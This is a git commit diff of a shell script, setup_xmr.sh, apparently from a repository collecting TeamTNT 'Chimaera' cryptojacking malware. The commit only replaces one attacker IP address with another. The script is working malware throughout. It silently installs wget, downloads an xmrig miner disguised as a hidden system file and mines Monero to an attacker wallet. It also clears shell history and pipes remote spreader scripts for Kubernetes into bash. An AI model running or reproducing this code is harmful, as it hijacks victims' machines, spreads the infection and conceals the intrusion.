361a011b06699129fe103089818db5f794c204d8
ToRxmrig <79212597+ToRxmrig@users.noreply.github.com>
2024-09-10 13:35:27 -0500

    Update setup_xmr.sh

--- TEAMTNT_MASTER_LIST/chimaera/45_9_148_35/45.9.148.35/chimaera/sh/setup_xmr.sh
+++ TEAMTNT_MASTER_LIST/chimaera/45_9_148_35/45.9.148.35/chimaera/sh/setup_xmr.sh
@@ -1,21 +1,21 @@
 #!/bin/bash
 
-# wget -q http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.tm
+# wget -q http://45.145.7.253/chimaera/sh/setup_xmr.sh -O /tmp/.tm
 
 if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi
-wget --no-check-certificate http://45.9.148.35/chimaera/bin/xmrig -O /var/tmp/.system
+wget --no-check-certificate http://45.145.7.253/chimaera/bin/xmrig -O /var/tmp/.system
 chmod +x /var/tmp/.system
 cd /var/tmp/
-./.system -o pool.supportxmr.com:3333 --donate-level=1 --coin=monero -u 46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCmAUrFd3H -p GesichtsKirmes -B
+./.system -o pool.supportxmr.com:3333 --donate-level=1 --coin=monero -u 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9 -p GesichtsKirmes -B
 history -c
 clear
 
-#wget -q http://45.9.148.35/aws -O /tmp/.kernel
+#wget -q http://45.145.7.253/aws -O /tmp/.kernel
 #chmod +x /tmp/.kernel
 #/tmp/.kernel
 #wget -O - borg.wtf/aws.sh | bash &
 
-$(wget -O - http://45.9.148.35/chimaera/sh/spread_kube_loop.sh | bash || curl http://45.9.148.35/chimaera/sh/spread_kube_loop.sh | bash) &
+$(wget -O - http://45.145.7.253/chimaera/sh/spread_kube_loop.sh | bash || curl http://45.145.7.253/chimaera/sh/spread_kube_loop.sh | bash) &
 
 rm -f /tmp/.x1mr
 rm -f /tmp/.x2mr
